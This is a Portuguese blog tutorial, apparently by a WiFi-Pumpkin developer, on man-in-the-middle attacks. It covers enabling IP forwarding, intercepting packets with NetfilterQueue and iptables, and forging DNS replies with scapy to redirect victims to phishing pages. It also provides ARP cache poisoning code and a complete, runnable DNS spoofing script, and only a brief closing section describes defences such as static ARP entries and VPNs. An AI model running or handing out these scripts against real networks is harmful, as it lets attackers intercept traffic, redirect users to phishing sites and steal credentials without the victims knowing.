---
layout: post
title: A arte do Man-in-the-middle attack P0x00
categories: [writeup]
tags: [dnsspoof linux forward redirect packets  NetfilterQueue scapy ]
fullview: true
comments: true
---

Iae Pessoas tudo bem ? Há alguns anos atrás comecei a codar um modulo sniffer de pacotes usando [scapy](https://scapy.net/) para a tool WiFi-Pumpkin (**WP**) do **PocL4bs Team**, onde sou o principal dev. Es que estou aqui para mostrar algumas coisas interessante que acabei aprendendo no processo de desenvolvimento. Esse será meu primeiro post sobre python de muitos. let go...

Quando comecei a implementação do módulo TCP proxy, antes disso tava eu estava procurando uma maneira melhor de fazer redirect de DNS request usando **scapy** sem apelar para **iptables**(diretamente). A ideia era criar um **dns spoof** que consiga redirecionar algums domínio selecionados para uma página de phishing por exemplo, no caso do **WP** que não precisa fazer **arpspoof** pois os dados da vitima já passam pelo atacante, com essa ideia em mente comecei a buscar informações sobre.

### Intrudução

Se você leitor não sabe como funciona um ataque de **man-in-the-middle**, let me explain to you.

"O wikipedia me diz que "O man-in-the-middle (pt: Homem no meio, em referência ao atacante que intercepta os dados) é uma forma de ataque em que os dados trocados entre duas partes (por exemplo, você e o seu banco), são de alguma forma interceptados, registrados e possivelmente alterados pelo atacante sem que as vitimas se apercebam."

Essa é a explicação está correta e tecnicamente falando funciona da seguinte forma, digamos que de alguma forma o atacante precisa fazer com que os pacotes enviado pela vítima (**sem proteção**) precise passar por ele para depois ser enviado para o **host destino** ou melhor dizendo, para o servidor. dessa forma, é possível modificar os pacotes (do protocolo http) da forma que quisermos e então fazer modificaçẽos tais como: remover header, adicionar header, remover informações, alterar o código do corpo da requisição, redirecionar para outro website e por fim capturar as credenciais (**PASSWORD**) envida pela vitima. Existe várias formas de fazer esse tipo de ataque uma dela e mais comum é fazer uma **baguncinha** na rede fazendo com que os dados antes de ser mandado para o **gateway local**  seja mandado pra você e logo em seguida seja enviado para o real destino o webserver original da requisição.

![meme](/images/posts/meme/baguncinha.jpg)

É possível fazer essa **baguncinha** usando uma tool chamada de  **arpspoof** (vem por default instalado no kali linux) na rede local, você pode programar seu próprio **arpspoof** ( com python mesmo ) fique tranquilo que iremos chegar lá em breve. A ideia por trás (arpspoof) ou melhor dizendo do ataque no protocolo **arp** é fazer uma alteração na tabela **arp** (Address Resolution Protocol – RFC 826) ou "portugueisando" **spoofar** de tal forma que possa confundir o gateway (roteador) e a máquina alvo, na verdade, essa mofidicação irá fazer com que todos os pacotes que antes seria enviado para o roteador (gateway), sejam enviado para a máquina do atacante que agora está sendo o novo roteador da rede local. o diagrama fica assim:
```
  +-------------+  <--------------------------+  +-------------+  ----->  +---------------+
  |    Alvo     |     Original Tragetória        |  Router     |          | Aplicação web |
  +----+---+----+  +-------------------------->  +----+---+----+  <-----  +---------------+
       ^ X |                                          | X ^
       | X v                                          v X |
       | X   Nova tragetória criada pelo atacente       X |
       | X +-----------> +---------------+  <---------+ X |
       | XXXXXXXXXXXXXXX |   Atacante    |  XXXXXXXXXXXXX |
       <-----------------+               +---------------->
                         |   arpspoof    |
                         +---------------+
```

Observe que nesse cenário temos a seguintes situação: o **Alvo** depois que o ataque de **arpspoof** é efetuado acaba enviando os dados, que normalmente seria enviado para o roteador para posteriomente enviar para a aplicação web, para o atacante na rede local. Dessa forma, o atacante tem total controle sobre os dados enviado e recebido (em HTTP) do cliente. O **Atacante** está a todo momento mando pacotes **arp** para o alvo e o roteador (gateway) simutaneamente para que o router passe a "achar" que o **Atacante** é o **Alvo**, e o **Alvo** acabe achando que o **router** é a máquina do **Atacante**, sendo assim obtemos o famoso ataque de **man-in-the-middle**. Só lembrando que esse processo não é complicado como parece na verdade se você escolher uma linguagem simples como python fica muito fácil a implementação.

### Configurações

Antes de você querer sai por aí rederecionando os pacotes, você primeiro precisa saber como isso é possível. No linux é possível fazer algumas configurações a nível de **kernel** para fazer com que ele consiga fazer **forward** ou roteamento em uma rede. Isso que dizer que é possível colocamos uma máquina entre dois ou mais segmentos de rede, permitindo a livre passagem de pacotes entre estes sempre que for necessário, só lembrando que esse parâmetro já vez desabilitado (**0**) por padrão no linux. Essa modificação é "setada" nos parêmetros do kernel do linux, (**aula de linux**) basicamente temos dois tipos de parâmetros no linux, os de runtime que você pode alterar com o kernel rodando e os parâmetros mais fixos que a gente pode alterar durante o boot , no grub, e resumindo você pode fazer da seguinte formas:
```
sudo sysctl -w net.ipv4.ip_forward=1
```
ou
```
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```
Usando qualquer uma das alternativas você irá obter o mesmo resultado, ou seja, mudar ip_forward para **enable** ou **1** ainda é possível fazer essa alteração Permanente, que não seria o nosso caso depois que terminar o experimento sempre desabilite essa opcão.

### Packets on the fly

Normalmente essa parte é a que muitos tutoriais na internet acaba apelando para o **iptables** que serve para adicionar uma regra de firewall a fim de redicionar as requisições de DNS para maquina do atacante. No entanto, usar o **iptables** acaba perdendo performance porque todos os pacotes para porta 53 seram redirecionados para um determinado serviço, que geralmente são um webservices rodando uma pagina fake de algum site, gerando um delay na conexão. além disso, se o ataque for direcionado para várias máquina algumas ficará sem acesso a internet. Pensando nisso resolvi pesquisar como melhorar essa interação de tal forma que possa ter um melhor aproveitamento e que pudesse ter um controle maior e mais direcionado na rede, alguns dias se passaram e acabei achando uma lib em python que resolvia meus problemas e ainda melhor parte sem implementar do zero. o módulo do python é o [NetfilterQueue](https://pypi.org/project/NetfilterQueue/).

```
NetfilterQueue provides access to packets matched by an
iptables rule in Linux. Packets so matched can be accepted,
 dropped, altered, or given a mark.
```
Visite o site acima e procure instala-lo no seu sistema operacional linux, perceba que ele depende de uma lib  chamada de **libnetfilter-queue-dev** que na verdade ela que faz todo trabalho pois ela é uma API para manipular **packets**  que foram enfileirados pelo filtro de pacotes do kernel.

Para entender como funciona **NFqueue** precisamos entender como a arquitetura dentro do kernel do linux. Quando um pacote é enviado para um destino **NFqueue**, ele é barrado e enfileirado (QUEUE) para uma fila que corresponde ao número da opção --queue-num (by default 1).
```
iptables -I INPUT -d 192.168.0.0/24 -j NFQUEUE --queue-num 1
```
Essa fila que pacotes é implementada como uma lista encadeada, que os elementos são os pacotes e os metadados (linux **skb** socket buffer), dessa forma você acabando entendendo o perigo como algumas rootkits para linux se esconde na rede (detalhe mesmo em userland), quando você tiver um tempo pesquise sobre o protocolo que fica entre o userspace e kernel chamado **nfnetlink**, sem spoiler. Olha só como é simples usar esse módulo para controlar o fluxo de packets na rede.

``` py
from netfilterqueue import NetfilterQueue

def print_and_accept(pkt):
    print(pkt)
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
```
Imagine agora você fazer **from scapy.all import \*\** :D.

![meme2](/images/posts/meme/diabo.png)

"Combar" o **scapy** + **NetfilterQueue** é dizer para rede que você agora tem total controle sobre tudo, podemos também usar esse método para fazer analise de malware que de alguma forma se comunica em uma porta específica ou até mesmo um tipo de pacote específico. por exemplo, você pode controlar os pacotes enviados  para uma determinada porta e modifica-lo como quiser.
``` sh
iptables -A OUTPUT -p tcp –dport 1337 -j NFQUEUE
```

``` python

def callbackPackets(i, payload):
  data = payload.get_data()
  print(data)


if __name__ == '__main__':
  q = nfqueue.queue()
  q.open()
  q.bind(socket.AF_INET)
  q.set_callback(callbackPackets)
  q.create_queue(0)

  try:
    q.try_run()
  except KeyboardInterrupt:
    print "Exiting..."
    q.unbind(socket.AF_INET)
    q.close()
    sys.exit(1)
```

Se importarmos o módulo do scapy podemos mofificar,remontar, extrair e enviar o pacote como se fosse o pacote original. Com essa ideia resolvi criar meu próprio **dnsspoof** que iria criar um handler da porta 53 UDP para filtrar apenas os pacotes que seria requisições de **DNS** e dessa forma permitindo fazer redirecionamento para qualquer **webservice**. O scapy oferece suporte para detectar qualquer tipo de pacotes sem precisar fazer na mão, inclusive é possível saber até a camada antes de fazer qualquer modificação no pacote evitando pacotes quebrados por não ser do mesmo tipo.

OBS:
>
Só lembrando que tive extrema dificudade para rodar esse código **threaded** na marioria das tentativas a aplicação congelou (sinceramente não sei o porque talvez seja por ta usando esse tipo de filtro), foi preciso rodar em outra Process thread separadamente..

### DNS (Domain Name System)

Se você não conhece TCP/IP sugiro fortemente que leia o livro "tcp illustrated" ou leia a **RFC** mesmo sendo um livro antigo, não mudou muita coisa, só foi acrescentada algumas camadas. defição:
>
The Domain Name System (DNS) is a hierarchical decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It associates various information with domain names assigned to each of the participating entities.

O protocolo DNS usa UDP ( User Datagram Protocol ), não sei se ta certo( pesquise sobre isso e corrija se necessário) mas o protocolo UDP é usado pois as requisições precisam ser rapidas e como o TCP é bem mais chato de trabalhar pois.TCP são mais "seguros", a melhor opção é usar UDP mesmo. A porta associada como já citei acima é a 53 para server requests, os DNS queries  são requisições enviada como se fosse um pedido um request enviado pelo cliente o server precisa mandar outro packet UDP reply. DNS packets overview:

![DNS](/images/posts/DNS/dnspackets.png)

Com scapy module podemos reescrever esse tipo de requisição muito fácil, e posteriomente montar um novo pacote contendo a requição alterada. Dessa forma, podemos desmontar o pacote que o cliente enviou e pegar apenas a query onde contem o domain que ele deseja acessar tipo **example.com**.

``` python
def callback(self,packet):
    payload = packet.get_payload()
    pkt = IP(payload)
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        print(pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]) # www.example.com
```

Sabendo disso, podemos remontar o packet modificando apenas **rdata** contendo o endereço IP do web server, podemos ainda redicionar o cliente para qualquer webserver sem alterar na URL no browser.

``` python
spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='IP TO REDIRECT'))
packet.set_payload(str(spoofed_pkt))
send(spoofed_pkt,verbose=False)
packet.accept()
```

#### ARP spoofing ou ARP cache poisoning

Você leitor vai pensando como se defender desse tipo de ataque, lógico no final irei apresentar algumas soluções, porque é um ataque simples de fazer e na maioria das vezes o atacante consegue éxito seja lá qual for a intensão dele, até mesmo tirar a conexão com a internet como algumas aplicativos fazem no android, por exemplo **WiFikill** que usa esssa mesma técnica a partir de um aparelho "rootiado". só pare resfescar a sua mente wiki:

>
ARP spoofing ou ARP cache poisoning é uma técnica em que um atacante envia mensagens ARP (Address Resolution Protocol) com o intuito de associar seu endereço MAC ao endereço IP de outro host, como por exemplo, o endereço IP do gateway padrão, fazendo com que todo o tráfego seja enviado para o endereço IP do atacante ao invés do endereço IP do gateway.

Interpretando o texto acima, pereceba que a única coisa que o atacante faz é mandar packets ou messagens do tipo **ARP** para forçar o cliente ou a vítima mandar os requests para ele. Sabendo disso, a única informação que ele precisa no momento é saber quem é o gateway, ou melhor dizendo quem é o **MAC (Media Access Control)** do gatway, e o **MAC** da vítima que é muito simples de detectar em uma rede LAN **(local area networks - LAN)**.

Para montar o nosso packet ARP spoofing, precisamos apenas de duas informações como citei acima **sourceMac** and **destMAC**, não irei explicar cada um dos campos do pacotes pois essas informações é por sua conta amigo. diagrama:

![arp_packet](/images/posts/DNS/arp.png)

#### thread 1

Na prática fica assim:

``` python
self.srcAddress = 'GATEWAY'
self.dstAddress = 'TARGET'
self.mac        = 'ATACANTE'

ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
op = "is-at",hwsrc = self.mac,psrc = self.srcAddress,hwdst =
'ff:ff:ff:ff:ff:ff',pdst = self.dstAddress)
padding = Padding(load = "\x00"*18)
packet_arp= ether/parp/padding
```
>
ATACANTE -"olá gateway, a partir de agora eu sou a máquina TARGET, então tudo que você for mandar pra esse MAC mande pra mim"

#### thread 2

``` python

self.srcAddress = 'TARGET'
self.dstAddress = 'GATEWAY'
self.mac        = 'ATACANTE'

ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
op = "is-at",hwsrc = self.mac,psrc = self.srcAddress,hwdst =
'ff:ff:ff:ff:ff:ff',pdst = self.dstAddress)
padding = Padding(load = "\x00"*18)
packet_arp= ether/parp/padding
```
>
ATACANTE -"olá TARGET, a partir de agora eu sou o GATEWAY, então tudo que você for mandar pra esse MAC mande pra mim"

Isso rodando em **thread** separada e mandando repetidamente, e como diria prof. Yvis (Fisica total) simples assim fera.

Como você pode ver acima, as duas threads tem algum semelhante, o que muda apenas  **macOrigem** e o **macDestino**. logo, podemos escrever uma thread universal e apenas passsar os parâmetros para cada instância das **threads** ou fazer tudo em uma thread só mesmo você que escolhe, fica assim:

``` python
from threading import Thread
from scapy.all import *

class ThreadARPPoison(Thread):
    def __init__(self,srcAddress,dstAddress,mac):
        Thread.__init__(self)
        self.srcAddress = srcAddress
        self.dstAddress = dstAddress
        self.mac        = mac
        self.process    = True

    def makePacket(self):
        ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
        parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
        op = "is-at",hwsrc = self.mac,psrc = self.srcAddress,hwdst =
        'ff:ff:ff:ff:ff:ff',pdst = self.dstAddress)
        padding = Padding(load = "\x00"*18)
        packet_arp= ether/parp/padding
        return packet_arp

    def run(self):
        print('[*] starting thread')
        pkt = self.makePacket()
        while self.process:
            send(pkt,verbose=False, count=3),sendp(pkt,verbose=False, count=3)

    def stop(self):
        self.process = False
        print('[!] stop thread ')

```

Mas como eu irei saber se realmente está funcionando o ataque ? para responder essa pergunta voltamos para o conhecimento de rede, para que uma ataque desse funcione alguma coisa teria que ser altera e essa coisa é examante a tabela ARP que no caso como você ta fazendo esses teste em um ambiente simulado podemos verificar se essas modificações realmente estão acontecendo. no windows basta abrir o **cmd** e digitar o comando abaixo :
```
arp -a
```
Esse comando é básicamente para verificar se a tabela arp está envenenada como o pessoal costuma referenciar, a saída desse comando é algum assim:
```
C:\Users\lab>arp -a

Interface: 10.0.2.15 --- 0xb
  Endereço IP           Endereço físico       Tipo
  10.0.2.1              01-00-5e-00-00-16     dinâmico  (Gateway)
  10.0.2.34             54-ff-32-a5-5c-b4     dinâmico
  10.0.0.22             01-00-5e-00-00-16     dinâmico  (Atacante)

C:\Users\lab>
```

Perceba que o endereço físico do **atacante** está igual ao endereço físico do **gateway**, isso significa que alguém está envenenando a tabela arp para que os dados sejam desviados. dessa forma, o atacante é capaz de ler e modificar em tempo real absolutamente todos os pacotes.

código do Dnspoof usando module NetfilterQueue:

``` python
#!/usr/bin/env python
import argparse
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *
from netfilterqueue import NetfilterQueue

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes new implementation
    for Dns spoof Attack with NetfilterQueue and iptables.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class DnsSpoofNetFilter(object):
    def __init__(self):
        """ implementation Dnsspoof with Netfilterqueue modules"""
        description = "Module DNS spoofing v0.1"
        usage = "Usage: use --help for futher information"
        parser = argparse.ArgumentParser(description = description, usage = usage)
        parser.add_argument('-d','--domains', dest = 'domains', help = 'Specify the domains', required = True)
        parser.add_argument('-r', '--redirect', dest = 'redirect',  help = 'Redirect host ', required = True)
        self.args = parser.parse_args()

    def callback(self,packet):
        payload = packet.get_payload()
        pkt = IP(payload)
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1] in self.domain:
                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt,verbose=False)
                packet.accept()
            elif len(self.domain) == 1 and self.domain[0] == '':
                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt,verbose=False)
                packet.accept()
            else:
                packet.accept()

    def main(self):
        self.redirect, self.domain = self.args.redirect, self.args.domains.split(',')
        self.q = NetfilterQueue()
        self.q.bind(0, self.callback)
        self.q.run()

if __name__ == "__main__":
    dnsspoof = DnsSpoofNetFilter()
    dnsspoof.main()
```

### Proteções contra ARP spoof

Para se proteger desse tipo ataque, você pode evitar acessar redes desconhecidas/públicas. Além disso, o usar VPN é uma boa saída para evitar esse e qualquer outro tipo de ataque do tipo LAN, outra forma também muito recomendada é usar endereços stático da tabela arp, ou seja, quando você insere uma entrada estática na teblea ARP, informa ao seu computador que o endereço mac do roteador é permanente e não será alterado. Portanto, seu computador ignora qualquer pacote ARP falso enviado pelo atacante.

```
netsh interface ipv4 add neighbors "Local Area Connection" Gateway MAC
```

Por último e não menos importante temos a melhor solução de todas, essa é a solução que funciona para qualquer sistema operacional,"remova o cabo da internet ou do roteador". Bricadeiras a parte isso é tudo pessoal, espero que tenha ajudado algum curioso como eu que sempre está aprendendo coisas novas, qualquer crítica pode deixar nós comentários recomendo fortemente :D, até um futuro próximo.

by: Marcos Bomfim a.k.a mh4x0f

Referências:

>
https://pt.wikipedia.org/wiki/Ataque_man-in-the-middle
http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
https://pt.wikipedia.org/wiki/ARP_spoofing
http://ispipdatanetworks-learning.blogspot.com/2015/10/arp-packet-format-and-different-types.html
https://serverfault.com/questions/102736/persistent-static-arp-entries-on-windows-is-it-possible
https://superuser.com/questions/391108/how-can-i-add-an-active-arp-entry-on-win-7
